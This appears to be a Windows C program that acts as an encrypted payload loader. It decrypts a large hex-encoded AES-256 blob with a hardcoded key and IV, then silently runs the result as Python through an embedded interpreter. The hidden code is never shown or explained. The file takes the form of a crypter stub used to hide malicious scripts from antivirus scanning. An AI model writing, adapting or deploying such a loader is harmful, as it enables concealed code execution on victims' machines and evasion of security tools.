#include <openssl/aes.h>
#include <openssl/rand.h>
#include <openssl/rsa.h>
#include <openssl/pem.h>
#include <openssl/err.h>
#include <openssl/applink.c>
#include <python3.11/Python.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define AES_KEY_BITS 256
#define AES_IV_SIZE 16

void hex_to_string(const unsigned char *hex_array, size_t len, unsigned char *decoded_string) {
    if (len % 2 != 0) {
        printf("Error: hex_array length is not even.\n");
        return;
    }

    for (size_t i = 0; i < len / 2; i++) {
        sscanf((const char *)&hex_array[i * 2], "%2hhx", &decoded_string[i]);
    }
}

void decrypt_aes(const unsigned char *aes_key_hex, const unsigned char *aes_iv_hex, 
                  const unsigned char *input_hex, unsigned char **result, size_t *result_len) {
    unsigned char aes_key[AES_KEY_BITS / 8];
    unsigned char aes_iv[AES_IV_SIZE];
    
    hex_to_string(aes_key_hex, strlen((const char *)aes_key_hex), aes_key);
    hex_to_string(aes_iv_hex, strlen((const char *)aes_iv_hex), aes_iv);

    unsigned char input[20000];
    size_t input_len = strlen((const char *)input_hex) / 2;
    hex_to_string(input_hex, strlen((const char *)input_hex), input);

    unsigned char buffer[1024];
    unsigned char plaintext[1024 + EVP_MAX_BLOCK_LENGTH];
    EVP_CIPHER_CTX *ctx;
    int len, plaintext_len;
    size_t total_plaintext_len = 0;
    size_t buffer_size = sizeof(plaintext) * 2;
    unsigned char *full_plaintext = malloc(buffer_size);

    if (!full_plaintext) {
        perror("Unable to allocate memory");
        exit(EXIT_FAILURE);
    }

    ctx = EVP_CIPHER_CTX_new();
    EVP_DecryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, aes_key, aes_iv);

    const unsigned char *ptr = input;
    size_t remaining_len = input_len;

    while (remaining_len > 0) {
        size_t chunk_size = (remaining_len > sizeof(buffer)) ? sizeof(buffer) : remaining_len;
        memcpy(buffer, ptr, chunk_size);

        if (!EVP_DecryptUpdate(ctx, plaintext, &plaintext_len, buffer, chunk_size)) {
            ERR_print_errors_fp(stderr);
            exit(EXIT_FAILURE);
        }
        if (total_plaintext_len + plaintext_len > buffer_size) {
            buffer_size *= 2;
            full_plaintext = realloc(full_plaintext, buffer_size);
        }
        memcpy(full_plaintext + total_plaintext_len, plaintext, plaintext_len);
        total_plaintext_len += plaintext_len;

        ptr += chunk_size;
        remaining_len -= chunk_size;
    }

    if (!EVP_DecryptFinal_ex(ctx, plaintext, &plaintext_len)) {
        ERR_print_errors_fp(stderr);
        exit(EXIT_FAILURE);
    }
    memcpy(full_plaintext + total_plaintext_len, plaintext, plaintext_len);
    total_plaintext_len += plaintext_len;

    full_plaintext[total_plaintext_len] = '\0';
    EVP_CIPHER_CTX_free(ctx);

    *result = full_plaintext;
    *result_len = total_plaintext_len;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    
    unsigned char aes_key_hex[] = "dc0e68af5e37726d7cf51a88c19028c202f249e9857978a5a0702ced91227327";
    unsigned char aes_iv_hex[] = "d48e8f872066162eabde33152dc604c6";
    unsigned char input_hex_py[] = "2eeafe63e0262d9ac74f40d9528c870716153e6fb07c157929ef8385d8c5e7582a05f596cf4b80e929d6ecf7fca05569130e4a1dd0e9b2a9489f4bebfb49f6b1544ec116a2d190713d9e73e232b69c672f26c6d4b725db4794aa44c78d76fae2a15881e80af05af95d2a37d3dd4ec6163e406f9c05814a9d3ccc6f0b0cccfbed2ab54f60f68023c7b67c434c15f2751d789ec6cda728d0c6d2d29b260a87b645360197cceb649d340b9c1eed71b7783addd5aa5a520c78ada512f23784f06fb179574a9f516fc3aea598bc765699cd7792ebf7c68ab5b30c5cb2f303184f635a1cb5f6dc28ab41035eba4cb6d1676c0a0c2d5edd480a971368e41a82de74eecf9c877b56c2ac5f61d3e37a05ad2ab245b0cd7e3acbb913aa5a8605ce14c01e6bc0d73cf5ced62c778ebf812501292047040b85b3f7aa8e130964f9cb357349c029535087873572da4fe21308b811bd891997140d4320eab2cf69ced2409ad4721de12b1fe7164d4b74fb7fd382deb0cd56003047eea90cdd1f56ffb670f33ab7f25be933bcb7b2914b1f7dc6e4e5201fe903de6a10bccf7abb8a77f488fd1ebd9ab0ce954f3673fc479ebe542f35632c152e9438f519775042044ef70e40f6ff349ec2c5fc3aebc48c5c60ef80e04586a319dfcd3151f6137b5e208615f39528622a64a2c434ef66eb2e556d6ddb0f6c124db7e84f526769e7b9911c390e569a5a01cefba213ac03dd2ff6317ccb79fdcb7980c38577db8d25e89f9edf2a67d1b8b52111ee18a180391f74d2559c230077d0829795f8c865a55aea3fdd4ddf18a7c42d4335f61e0ee14833fd26545bd7e6c4fa7dee3b7e7f0033e158dab1262bb087e25aa21b6d1fd9bf17869a520ee8a954913866b161f2a536f1ff4ce76d4fab5ef84a286f8b1b40f2226d72247f3699a0f6b614a54ac807c51c9d85dae45d69433eb3c9051d7ae708b6c9e306be9a1f00407aadec2427d8d86131caa4981e5ea7e5d8762824449e952352688c9c8ed00356a1b3be838e97ea2cdbad8cad7d7753d425d85488d753dd2ff16cd788f485f704932cabee39259093e85eca85b27072e62111369403559e44ff2fe885ad68b45a81dd2e0b5ecfa678e1df6b8466a150de3a46ac79c742e17016d06b0101ddf97342e48396ed19aea425ed4309d7155b0a0f6de2f7036da8bca437da685af2020414bd85c4f98cdd700a8d88b27729b0390e93787c7fa4945f93d8905441b6292dea8d0c24781f04b8440d628c090edb4456ea97194ddf751bd0110ee85a89c682c70e80b238d926d2d5dc98382a92f650ffcc6a5c87702c081cb0619a79126e301123e2c88354c213246406bc36c6ac5404125f0af0406c619e43b910ebbe23b361f9a58fb4c57f811dc44dd806d4ddbb9426be37c0105e68cc1e22bf679b293c6df9d5ba3a3f7886a22de5b6ce5cec9bc3d6bba4b7f6cafdc497885f4e5ad2477182093c228ddb788abc785bec42415d75d086cae8da896431d6dd3161d805cd0d9a0c20a4444f8fbb0d98872a21d9750411d9f84b96b2a39fa41961c4e407cdeefe184ad8a4fb6b41278bf02c375e01f8ea448ae70f13cf1bb39e34844dc9135223c9808a2f96fda0743fb7de04a6c32990aececac8ba7731a870878f0e352f755adc9d199706996861394c31e37094a086f2c5c5745bf5e589bc58246f110d7b21ebf59562fc782067ef4682ebe659163de684852ccd5dc1ce19fda9ea56613ca4220dd8cf766a10dcb609c06c220e05d7fd50d5c74e0855eff9c29e67b621eedc698368b2ae86c02dfc8e2aa4e9bc738aa8cdf0f2c31082bf6570ea3141bc3c415b8c4c61c3de38a8ddb708b3499ccceeda790e6bac9f6946f94cb8d2401ebdc98add5ecd731c1b10d338a30c95a2801fe0c36d4e52dac2803e3e53913f26c46ded5e90e013bae304a6ba896f6f7bd36ef934d0fe969f70c943ac1ca06583de196b752daf7263521dcfcf2d5c13a0845c1eb894948c2efd80725750352a50d55e52efebe1926fa8316ee54d347ec7d511a913a463402e0ccc0301f61b6b0fa2fb10aeda17463ee2c68ee4d60a84c02b90f164165b873ae1a3e609d078451eda62c3ef933af409cf326a54e072e53b0907a2391f85dae1118ed6fb92221e4e9de8236b8a1260b1521cd3a3e86cc0b18da4bdbdf9393e036b4e781b8f26daea7845576d999e3977fea9d433fc7af44f31e77f00888ee814bf17fc3c1220cd49a6a1442950f41ac9202ae9e934ab52b844260bca2e12b6bed96649fa219350d63e0982ed8df483a2946dc3251fea0aee761b1631cad72a50ae03a4163eeb1b8a1f308794d414535b9b4949d6bbf475a8c4428fe2bd99f6acde36f86b1c86a50fbd16291ad32fa41c33cabfd0d8855667085fc836098f0a8c2782b616d6c8d529316fcc3cedd6aad392fec632b6e371559cc76aa0ee97024103060129f52b5a0d20775ce530a34b22d811377769091e4786c1fb27ecdcfdcceac97d2a660d415c0815125b617156e16be647221bc2e42a6096845fbcfa4b952691510d59a119e660127ef62091780bcf0fa352e0a1c377d520b48ad26349eeaecb66699d0cfead68a657a7d123c9324e9766561cdd88d03f7405440491c782237fd041cbdd4474dc3ea6189b4795a0ac8302c5068cef581bbc83dd979dadb8436ea49331f49c18ad4a1f603a53512557573ed7e9d0edebf209a7e9ae78f89175b78ae4881ae38f182518a4022082d884b4648ee0ebd8905fe46f3e36dd793ae127321db9f6a58870e123e87be61fe2c63138f7689f8e6bb01b07664347eb3a5fe6f8864fb7ffdabf63886a13853be9c20932676ef76804dbc73c04011dda353ad5f427f7e6b39fc847ef67d0f3bbcfdb23d2e4c15a888225f9f60653a8f6cb2b05ce804622c393889867d19a92ad76d5595d4e79258a5fe9f374631e33ce99daa99de4910f1e8d08c69fd0d8bbb2a777e6377307e82b51290e293a9a6afd3e4e999dbd66d4b7a1cf8ec7f914c49983b1b111e15c53c67623a9a828d0cfdf6f03d6e649854ee7c8eab71285c97f430690ca90389d17ac69a6a1a943f3ff4f61d75a213f1bc0c5dc5abe1895390cd2c28675d823b5ba19d9318d474a96c741ec79ac9baaf1dca07716baebef3e712ced0148b12127292ec8e8608837be88c0f4bd54aa285ef0c9a6fec88b45f7c30456136c37d9a81ce7f62bafc8e13d272ecbef7f15347d5d4ed786eed948bf747fdb4f311c3edbbe289097c0c1bfc9160bd75a1201b71fdb73fe7a2b456a7917befdb86fd7954e";
    unsigned char *decrypted_text = NULL;
    size_t decrypted_len = 0;

    decrypt_aes(aes_key_hex, aes_iv_hex, input_hex_py, &decrypted_text, &decrypted_len);

    if (decrypted_text) {
        Py_Initialize();
        PyEval_InitThreads();

        PyGILState_STATE gstate = PyGILState_Ensure();
        PyRun_SimpleString((const char *)decrypted_text);

        PyGILState_Release(gstate);
        Py_Finalize();

        free(decrypted_text);
    }

    return 0;
}
